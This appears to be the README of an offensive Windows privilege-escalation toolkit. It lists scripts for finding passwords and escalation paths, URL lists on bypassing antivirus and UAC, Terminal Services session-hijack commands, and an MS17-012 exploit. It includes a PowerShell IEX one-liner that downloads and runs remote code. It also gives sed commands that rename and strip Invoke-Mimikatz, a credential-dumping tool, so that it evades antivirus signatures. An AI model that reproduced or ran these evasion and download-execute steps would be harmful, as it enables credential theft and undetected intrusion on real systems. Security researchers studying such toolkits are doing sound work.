# WinEscalation-

Scan.ps1:
Powershell script used to determine what methods can be used to escalate privileges and find passwords (admin and non-admin privs).


AVbypass.txt:
List of URLs discussing different methods of bypassing AV.

TScommands.txt:
Commands on how to hijack a TS session on a box (must have admin rights).

UACbypass.txt:
URLs discussing different methods of bypassing UAC.


MS17-012/CVE-2017-0100:
Start-ProcessInSession.ps1 & MS17-012.cs - non-priveleged session hijack



Author: Scott Sutherland 2013, NetSPI
Version: Get-SPN version 1.1
Requirements: Powershell v.3
Comments: The technique used to query LDAP was based on the "Get-AuditDSDisabledUserAcount" 
function found in Carols Perez's PoshSec-Mod project.#
Modded to bypass AV sig detection.
https://github.com/nullbind/Powershellery/blob/master/Stable-ish/Get-SPN/Get-SPN.psm1

Get-SPM.psm1: 

IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/pand0rausa/WinEscalation-/master/Get-SPM.psm1")

Mimikitten mod to avoid AV:
mimikitt.ps1


Mimikatz mod to avoid AV:
mimi.ps1

sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1
sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1
sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Mimikatz.ps1
sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' Invoke-Mimikatz.ps1
sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions\$Win32Functions #\-/g" Invoke-Mimikatz.ps1


Powerview mod to avoid AV:
powervw.ps1
